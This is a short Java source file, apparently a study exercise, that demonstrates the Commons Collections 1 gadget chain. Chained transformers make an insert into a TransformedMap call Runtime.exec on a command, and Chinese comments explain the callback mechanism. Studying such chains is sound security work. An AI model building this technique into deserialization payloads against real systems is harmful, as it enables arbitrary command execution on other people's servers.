package CommonCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"fsearch"}),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);


        Map innerMap = new HashMap();
        // TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可
        // 以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map

        // 其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。
        // 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");
    }
}
